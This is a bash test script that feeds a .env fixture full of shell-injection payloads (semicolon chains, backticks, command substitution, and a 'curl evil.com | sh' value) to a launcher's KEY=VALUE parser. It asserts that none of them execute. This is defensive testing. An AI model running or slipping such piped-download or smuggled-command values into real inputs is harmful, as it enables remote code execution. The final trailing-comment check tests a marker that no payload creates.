#!/usr/bin/env bash
# Test for mem0-launcher's KEY=VALUE parser — verifies that injection payloads
# (semicolon chains, trailing commands) are NOT executed by the wrapper.
# See REVIEW-rd2 (H22).
set -euo pipefail

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

# 1. .env.mem0 with multi-line content including classic injection payloads.
cat > "$TMPDIR/.env.mem0" <<'EOF'
MEM0_LLM_MODEL=qwen2.5:7b
; touch "$TMPDIR/pwn-via-semicolon"
MEM0_X=ok; touch "$TMPDIR/pwn-via-inline-semicolon"
MALICIOUS=`touch "$TMPDIR/pwn-via-backticks"`
EVAL_ME=$(touch "$TMPDIR/pwn-via-cmd-substitution")
EVIL_KEY=value # curl evil.com | sh
spaces=ignored
NORMAL_KEY=normal-value
EOF

# 2. Stub `mem0-mcp-selfhosted` that just prints OK and exits.
mkdir -p "$TMPDIR/bin"
cat > "$TMPDIR/bin/mem0-mcp-selfhosted" <<'EOF'
#!/usr/bin/env bash
echo "STUB OK"
exit 0
EOF
chmod +x "$TMPDIR/bin/mem0-mcp-selfhosted"

# 3. Copy the real wrapper into the tempdir (the test should test the
#    canonical wrapper, not a copy of itself).
WRAPPER_SRC="$(cd "$(dirname "$0")" && pwd)/mem0-launcher"
cp "$WRAPPER_SRC" "$TMPDIR/mem0-launcher"

# 4. Run the wrapper with the stubbed bin in PATH and TMPDIR as the root.
OUTPUT=$(PATH="$TMPDIR/bin:$PATH" MCP_TOOLS_ROOT="$TMPDIR" \
  "$TMPDIR/mem0-launcher" 2>&1) || true

# Sanity: the stub was actually invoked.
if ! echo "$OUTPUT" | grep -q "STUB OK"; then
  echo "FAIL: stub mem0-mcp-selfhosted was not invoked" >&2
  echo "Output was: $OUTPUT" >&2
  exit 1
fi

# 5. Assertions: no injection payload should have created a marker file.
FAIL=0
for expected in pwn-via-semicolon pwn-via-inline-semicolon pwn-via-backticks pwn-via-cmd-substitution; do
  if [ -e "$TMPDIR/$expected" ]; then
    echo "FAIL: injection succeeded — $expected was created" >&2
    FAIL=1
  fi
done

# `EVIL_KEY` was rejected by the parser (non-valid key per spec? actually
# uppercase + alnum+_ → valid). The comment suffix is NOT part of the parse
# unit — we only split on the FIRST `=`, so the value would include
# "value # curl evil.com | sh" verbatim, but the shell never executes that
# because we use `export "$key"="$val"`, not eval. Just sanity-check that
# the marker for it doesn't exist on disk.
if [ -e "$TMPDIR/pwn-via-trailing-comment" ]; then
  echo "FAIL: trailing-comment injection succeeded" >&2
  FAIL=1
fi

if [ $FAIL -eq 0 ]; then
  echo "PASS: no injection succeeded through mem0-launcher"
  exit 0
fi
exit 1
